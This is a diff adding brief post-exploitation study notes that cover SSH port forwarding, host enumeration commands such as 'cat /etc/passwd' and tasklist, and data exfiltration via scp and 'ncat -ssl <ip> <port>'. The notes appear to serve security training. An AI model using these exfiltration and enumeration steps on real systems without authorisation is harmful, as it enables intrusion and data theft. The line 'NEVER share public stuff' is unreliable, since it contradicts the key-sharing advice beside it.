@@ -584,4 +584,66 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Day 7: Post exploitation
+   ## SSH
+     -ssh local port -L | remote port -R
+     -windows ssh: netsh
+     -SSH Keys
+       a. share public key to intiate connection
+       b. NEVER share public stuff
+
+  ## Local Host Enumeration
+    -net user
+    -cat /etc/passwd
+
+    -tasklist /v
+    -ps -elf
+
+    -tasklist /svc
+    -chkconfig
+    -systemctl --type=service
+
+    -ipconfig /all
+    -ifconfig -a
+    -ip a
+
+  ### Data Exfiltration
+    -scp <source> <destination>
+    -ncat -ssl <ip> <port>
+
+
+
+
+
+
       
